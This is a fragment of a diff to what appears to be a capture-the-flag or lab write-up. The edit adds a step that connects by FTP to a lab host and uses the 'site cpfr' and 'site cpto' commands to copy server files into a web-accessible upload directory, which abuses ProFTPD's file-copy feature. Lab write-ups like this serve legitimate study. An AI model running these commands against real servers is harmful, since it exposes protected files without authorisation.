@@ -10,8 +10,9 @@ after googling it i found how to connect to it
  ```
  ftp 10.0.101.2
  ```
- then
+ then connect to ftp
  ```
+ ftp 10.0.101.2
  site cpfr /var/www/
  site cpto /var/www/html/upload/flag
  ```
